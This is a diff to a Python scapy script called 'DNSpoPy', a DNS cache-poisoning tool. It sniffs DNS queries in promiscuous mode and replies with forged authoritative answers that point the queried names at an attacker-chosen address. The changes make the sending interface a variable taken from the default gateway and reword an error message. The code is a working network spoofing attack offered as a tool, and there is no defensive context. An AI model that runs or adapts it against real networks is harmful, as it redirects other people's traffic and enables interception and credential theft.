@@ -8,11 +8,13 @@ import netifaces
 
 conf.sniff_promisc=True
 lo_addr = '127.0.0.1'
+interface = 'en0'
 hostnames_specified = False
 poison_map = {}
 def poison_cache(pkt):
 	global hostnames_specified
 	global lo_addr
+	global interface
 	if IP in pkt:
 		ip_src = pkt[IP].src
 		ip_dst = pkt[IP].dst
@@ -30,12 +32,13 @@ def poison_cache(pkt):
                      		UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      		DNS(id=pkt[DNS].id, qd=query, aa = 1, ancount = 1, qr=1, \
                      		an=DNSRR(rrname=query.qname, ttl=330, rdata=poison_addr))
-			send(spoofed_pkt, iface="enp0s5")
+			send(spoofed_pkt, iface=interface)
 			print 'Sent:', spoofed_pkt.summary()
 
 def main():
 	global hostnames_specified
 	global lo_addr
+	global interface
 	interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
 	lo_addr = netifaces.ifaddresses(str(interface))[netifaces.AF_INET][0]['addr']
 	try:
@@ -74,7 +77,7 @@ def main():
 	try:
 		sniff(iface = str(interface), filter = fexp, prn = poison_cache, store = 0)
 	except:
-		print "DNSpoPy: Invalid arguments to sniffer module. Are you root ?"
+		print "DNSpoPy: Something went wrong while invoking sniffer module. Are you root ?"
 		return
 if __name__ == "__main__":
 	main()
